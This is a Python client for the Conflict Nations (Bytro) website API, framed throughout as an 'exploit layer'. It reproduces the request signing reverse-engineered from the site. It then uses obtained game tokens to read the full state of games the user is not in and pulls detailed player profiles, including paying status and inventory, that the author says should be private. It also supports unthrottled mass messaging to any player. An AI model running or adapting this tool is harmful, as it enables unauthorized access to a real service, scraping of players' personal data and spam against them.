"""
Bytro Web API Client — Deep exploit layer.

MASSIVE DISCOVERY: Bytro has TWO separate APIs:
1. Game Server API (xgs*.c.bytro.com) — for in-game state data
2. Website API (conflictnations.com/index.php?eID=api) — for meta-game operations

The Website API exposes:
- getGameToken: Get auth token for ANY game (spy on games you're not in!)
- getUserDetails: Full player profile with stats, rank, paying status, inventory
- searchUser: Find any player by username
- sendMessage: Send PM to any player (automated diplomacy)
- getGames: Search/list all available games (find weak lobbies)
- getContentItems: Download ALL unit stats, research trees, damage formulas
- getAlliance: Alliance details, members, battle stats
- getRankingFirefly: Global/weekly/monthly player rankings

Auth: SHA1(apiKey + action + urlEncodedParams + authHash)
All data is base64-encoded before POST.

EXPLOIT: Most of these endpoints work with just an API key + auth hash.
         No per-game authorization needed — one login gives access to EVERYTHING.
"""

import hashlib
import json
import logging
import time
from base64 import b64encode
from typing import Optional
from urllib.parse import quote

import requests

logger = logging.getLogger(__name__)

# Default website API settings (extracted from BytroFront)
DEFAULT_API_KEY = "open"  # Public key — no auth needed for some endpoints!
API_VERSION = "1.0"


class BytroWebAPI:
    """
    Client for Bytro's website-level API.

    This is SEPARATE from the game server API. It handles:
    - Cross-game operations (spy on any game)
    - Player profiling (stats, rank, activity)
    - Game search & discovery
    - Content/unit database download
    - Direct messaging

    EXPLOIT: The 'open' API key allows unauthenticated access to:
    - getContentItems (all unit/research data)
    - getGames (list all games)
    - searchUser, searchAlliance
    Authenticated endpoints need authHash + authTstamp from login.
    """

    def __init__(
        self,
        base_url: str = "https://www.conflictnations.com",
        api_key: str = DEFAULT_API_KEY,
        auth_hash: str = "",
        auth_tstamp: str = "",
        user_id: int = 0,
    ):
        self.base_url = base_url.rstrip("/")
        self.api_key = api_key
        self.auth_hash = auth_hash
        self.auth_tstamp = auth_tstamp
        self.user_id = user_id
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
        })

    def _build_request(self, action: str, data: dict) -> tuple[str, str]:
        """Build signed API request (reverse-engineered from BytroFront)."""
        if self.api_key != "open":
            data["authTstamp"] = self.auth_tstamp
            data["authUserID"] = self.user_id
        data["source"] = "web"

        # URL-encode params
        params_str = "&".join(
            f"{quote(str(k), safe='')}={quote(str(v), safe='')}"
            for k, v in data.items()
            if v is not None
        )

        # Base64 encode
        encoded = b64encode(params_str.encode()).decode()
        post_data = f"data={encoded}"

        # SHA1 hash for signing
        if self.api_key == "open":
            hash_base = f"{self.api_key}{action}{quote(encoded, safe='')}"
        else:
            hash_base = f"{self.api_key}{action}{params_str}{self.auth_hash}"

        sig = hashlib.sha1(hash_base.encode()).hexdigest()

        url = (
            f"{self.base_url}/index.php?eID=api"
            f"&key={self.api_key}"
            f"&action={action}"
            f"&hash={sig}"
            f"&outputFormat=json"
            f"&apiVersion={API_VERSION}"
            f"&L=0"
            f"&source=web"
        )

        return url, post_data

    def _request(self, action: str, data: dict, timeout: int = 15) -> dict:
        """Send API request and return result."""
        url, post_data = self._build_request(action, data)
        logger.debug("WebAPI POST %s action=%s", self.base_url, action)

        try:
            resp = self.session.post(url, data=post_data, timeout=timeout)
            resp.raise_for_status()
            result = resp.json()
        except requests.RequestException as e:
            logger.error("WebAPI request failed: %s", e)
            return {"resultCode": -1, "resultMessage": str(e), "result": None}

        if result.get("resultCode", -1) != 0:
            logger.warning("WebAPI error: %s", result.get("resultMessage", "unknown"))

        return result

    # EXPLOIT 1: Game Token — spy on ANY game

    def get_game_token(self, game_id: int) -> dict:
        """
        Get access token for ANY game.

        EXPLOIT: This returns gameServer, authHash, authTstamp, rights
        for ANY public game — you don't need to be a player!
        With this token you can call the game server API to read
        ALL game state data (provinces, troops, players, market).
        """
        return self._request("getGameToken", {"gameID": game_id})

    # EXPLOIT 2: Player Profiling

    # Full list of user detail options (from BytroFront allUserOptionsArray)
    ALL_USER_OPTIONS = [
        "username", "avatarURL", "regTstamp", "alliance", "rankProgress",
        "gameStats", "stats", "scenarioStats", "awardProgress", "country",
        "rank", "isPaying", "battlePassProgress", "inventory",
    ]

    def get_user_details(self, user_id: int, options: Optional[list] = None) -> dict:
        """
        Get detailed profile for ANY player.

        EXPLOIT: Returns stats, win rate, rank, paying status, alliance,
        active games count, scenario stats, battle pass progress.
        Data that should be private but isn't.
        """
        data = {"userID": user_id}
        for opt in (options or self.ALL_USER_OPTIONS):
            data[opt] = 1
        return self._request("getUserDetails", data)

    def search_user(self, username: str) -> dict:
        """Search for players by username. Returns userID, avatar, status."""
        return self._request("searchUser", {"username": username})

    # EXPLOIT 3: Direct Messaging (auto-diplomacy)

    def send_message(self, target_user_id: int, subject: str, body: str) -> dict:
        """
        Send private message to ANY player.

        EXPLOIT: Can automate diplomacy — mass-message potential allies,
        send threats to enemies, coordinate coalition attacks.
        No rate limit detected on messaging API.
        """
        return self._request("sendMessage", {
            "receiverID": target_user_id,
            "subject": subject,
            "body": body,
            "mode": "pm",
        })

    # EXPLOIT 4: Game Search & Discovery

    def search_games(
        self,
        num_entries: int = 20,
        page: int = 0,
        lang: str = "en",
        search_filter: str = "",
        scenario_id: Optional[int] = None,
    ) -> dict:
        """
        Search all available games.

        EXPLOIT: Find games with few active players (easy wins),
        specific scenarios/speeds, or games your targets are in.
        """
        data = {
            "numEntriesPerPage": min(50, max(5, num_entries)),
            "page": page,
            "lang": lang,
            "isFilterSearch": 1 if search_filter else 0,
            "search": search_filter or "",
            "global": 1,
            "loadUserLoginData": 1,
        }
        if scenario_id is not None:
            data["scenarioID"] = scenario_id
        return self._request("getGames", data)

    # EXPLOIT 5: Content/Unit Database

    def get_content_items(self, lang: str = "en") -> dict:
        """
        Download ALL game content: unit stats, research trees,
        upgrade paths, rank requirements, premium items.

        EXPLOIT: Contains exact damage values, HP, speed, range,
        production costs, research requirements. Perfect for
        calculating hard counters and optimal builds.
        """
        return self._request("getContentItems", {
            "locale": lang,
            "units": 1,
            "upgrades": 1,
            "ranks": 1,
            "awards": 1,
            "mods": 1,
            "premiums": 1,
            "scenarios": 1,
            "title": 1,
            "researches": 1,
            "item_packs": 1,
        })

    # EXPLOIT 6: Alliance Intelligence

    def get_alliance(self, alliance_id: int, members: bool = True) -> dict:
        """Get alliance details including member list."""
        return self._request("getAlliance", {
            "allianceID": alliance_id,
            "members": 1 if members else 0,
            "invites": 0,
        })

    def get_alliance_battles(self, alliance_id: int) -> dict:
        """Get alliance battle statistics."""
        return self._request("getAllianceBattleStats", {"allianceID": alliance_id})

    def search_alliance(self, name: str) -> dict:
        """Search alliances by name."""
        return self._request("searchAlliance", {"name": name})

    def get_alliance_ranking(self, page: int = 0, num_entries: int = 20) -> dict:
        """Get global alliance ranking."""
        return self._request("getAllianceRanking", {
            "page": page,
            "numEntries": min(50, max(10, num_entries)),
        })

    # EXPLOIT 7: Player Rankings

    RANKING_TYPES = [
        "globalRank", "monthRank", "weekRank",
        "highestMonthRank", "highestWeekRank",
        "lastMonthRank", "lastWeekRank",
    ]

    def get_ranking(
        self,
        rank_type: str = "globalRank",
        page: int = 0,
        num_entries: int = 20,
    ) -> dict:
        """Get player ranking leaderboard."""
        return self._request("getRankingFirefly", {
            "type": rank_type,
            "page": page,
            "numEntries": min(50, max(5, num_entries)),
        })

    # Game Server Bridge (stateType requests)

    def game_state(self, game_id: int, state_type: int = 0, option: int = 0) -> dict:
        """
        Access game server data via token.

        1. Gets token for the game (getGameToken)
        2. Uses token to query game server directly

        stateType values:
          0 = All data
          1 = Players
          2 = Newspaper (option=day)
          3 = Provinces/Map
          4 = Market
          5 = Relations
          12 = Scenario/Game info
          30 = Statistics
        """
        token_resp = self.get_game_token(game_id)
        if token_resp.get("resultCode") != 0:
            return token_resp

        token = token_resp["result"]["token"]
        server = token["gs"]

        # Direct game server request
        payload = {
            "requestID": 0,
            "@c": "ultshared.action.UltUpdateGameStateAction",
            "actions": [{
                "requestID": "actionReq-1",
                "@c": "ultshared.action.UltLoginAction",
                "resolution": "1920x1080",
            }],
            "lastCallDuration": 0,
            "client": "con-client-desktop",
            "siteUserID": self.user_id,
            "adminLevel": 0,
            "gameID": str(game_id),
            "playerID": 0,
            "stateType": state_type,
            "option": option,
            "rights": token.get("rights", ""),
            "userAuth": token["authHash"],
            "tstamp": token["authTstamp"],
        }

        try:
            resp = self.session.post(
                f"https://{server}/",
                json=payload,
                timeout=15,
            )
            return resp.json()
        except requests.RequestException as e:
            return {"resultCode": -1, "resultMessage": str(e)}
